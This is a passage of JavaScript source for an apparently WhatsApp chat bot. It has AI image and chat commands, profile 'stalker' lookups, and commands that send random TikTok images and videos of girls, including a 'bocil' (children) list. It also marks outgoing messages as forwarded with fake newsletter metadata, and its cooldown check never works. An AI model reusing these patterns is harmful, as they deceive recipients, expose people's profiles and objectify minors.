          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'realistic': case '3dmodel': {
    	if (!text) return replygcxeon(`*Example:* ${prefix + command} blue sky`)
    let lastUsed = 0;
  let currentTime = Date.now();
  if (currentTime - lastUsed < 10000) return replygcxeon("Cooldown 10 seconds, try again later")
  lastUsed = currentTime;
  try {
    let negative = 'ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers, adult, naked, 18+';
    let gpt = await (await fetch(`https://itzpire.com/ai/${command}?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> ${command} AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygcxeon("`GPT Not Responding`")
  }
}
break
case 'photoleap': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} blue sea`);
  let currentTime = Date.now();
  let lastUsed = 0;
  if (currentTime - lastUsed < 10000) return replygcxeon("Cooldown 10 seconds, try again later");
  lastUsed = currentTime;
  try {
    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Photo Leap AI\n\n' + text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result_url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygcxeon("`*Error*`");
  }
}
break
case 'ai': case 'gpt': case 'openai': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt?model=gpt-4&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Chat GPT\n\n' + gpt.data.response
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
let me = m.sender
let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 👇 https://i.ibb.co/y6XmZ2b/donate.png`
sendXeonBotIncMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcxeon(lowq)
            	}
            break
			case 'xruntime': case 'testx': case 'xbot': {
				if (text && text.startsWith('--') && XeonTheCreator) {
					let buttonnya = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECT',
							sections: [{
								title: 'Bot Settings',
								rows: [
									{ title: 'Anti Call On🟢', description: 'Activate Anti Call', id: '.bot anticall on' },
									{ title: 'Anti Call Off🔴', description: 'Turn off Anti Call', id: '.bot anticall off' },
									{ title: 'Auto Bio On🟢', description: 'Enable Auto Bio', id: '.bot autobio on' },
									{ title: 'Auto Bio Off🔴', description: 'Turn off Auto Bio', id: '.bot autobio off' },
									{ title: 'Auto Read On🟢', description: 'Enable Auto Read', id: '.bot autoread on' },
									{ title: 'Auto Read Off🔴', description: 'Turn off Auto Read', id: '.bot autoread off' },
									{ title: 'Auto Type On🟢', description: 'Enable Auto Type', id: '.bot autotype on' },
									{ title: 'Auto Type Off🔴', description: 'Turn off Auto Type', id: '.bot autotype off' },
									{ title: 'Read SW On🟢', description: 'Enable Read SW', id: '.bot antiswview on' },
									{ title: 'Read SW Off🔴', description: 'Turn off Read SW', id: '.bot antiswview off' },
								]
							}]
						}
					}]
					await XeonBotInc.sendButtonMsg(m.chat, 'Bot Settings', xeonytimewisher, 'Please select Owner🫡', null, buttonnya, m);
				} else if (text && XeonTheCreator) {
					if (text === 'anticall on') db.settings[botNumber].anticall = true, replygcxeon('Successfully Activating Anticall');
					if (text === 'anticall off') db.settings[botNumber].anticall = false, replygcxeon('Successfully Turning Off Anticall');
					if (text === 'autobio on') db.settings[botNumber].autobio = true, replygcxeon('Successfully Activating Autobio');
					if (text === 'autobio off') db.settings[botNumber].autobio = false, replygcxeon('Successfully Turning Off Autobio');
					if (text === 'autoread on') db.settings[botNumber].autoread = true, replygcxeon('Successfully Activating Autoread');
					if (text === 'autoread off') db.settings[botNumber].autoread = false, replygcxeon('Successfully Turning Off Autoread');
					if (text === 'autotype on') db.settings[botNumber].autotyping = true, replygcxeon('Successfully Activating Autotype');
					if (text === 'autotype off') db.settings[botNumber].autotyping = false, replygcxeon('Successfully Turning Off Autotype');
					if (text === 'antiswview on') db.settings[botNumber].readsw = true, replygcxeon('Successfully Activating Read SW');
					if (text === 'antiswview off') db.settings[botNumber].readsw = false, replygcxeon('Successfully Turning Off Read SW');
					let settingsBot = Object.entries(db.settings[botNumber]).map(([key, value]) => {
						let qhk = (typeof value === 'boolean') ? (value ? 'on🟢' : 'off🔴') : value;
						return `${key.charAt(0).toUpperCase() + key.slice(1)} : ${qhk}`;
					}).join('\n');
					if (text === 'settings') replygcxeon(settingsBot);
				} else {
					XeonBotInc.sendMessage(m.chat, { text: `*Bots Have Been Online For*\n*${runtime(process.uptime())}*` }, { quoted: m })
				}
			}
			break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcxeon(`Example ${prefix+command} DGXeon`)
await XeonStickWait()
let githubstalk = require('./lib/scraper')
aj = await githubstalk.githubstalk(`${q}`)
XeonBotInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return replygcxeon(`Example ${prefix+command} xeonapi`)
await XeonStickWait()
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
replygcxeon(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk':{
if (!q) return replygcxeon(`Example ${prefix+command} 946716486`)
await XeonStickWait()
let ffstalk = require('./lib/scraper')
eeh = await ffstalk.ffstalk(`${q}`)
replygcxeon(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
			case 'mlstalk': {
if (!q) return replygcxeon(`Example ${prefix+command} 530793138|8129`)
await XeonStickWait()
let mlstalk = require('./lib/scraper')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcxeon(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
			case 'tiktokstalk': {
	  if (!text) return replygcxeon(`Username? `)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
  await XeonBotInc.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break
			case 'tiktokgirl':{
await XeonStickWait()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokghea':{
await XeonStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokbocil':{
await XeonStickWait()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknukhty':{
await XeonStickWait()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoksantuy':{
await XeonStickWait()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokkayes':{
await XeonStickWait()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokpanrika':{
await XeonStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknotnot':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'chinese':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hijab':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'japanese':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'korean':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'malay':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomgirl':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
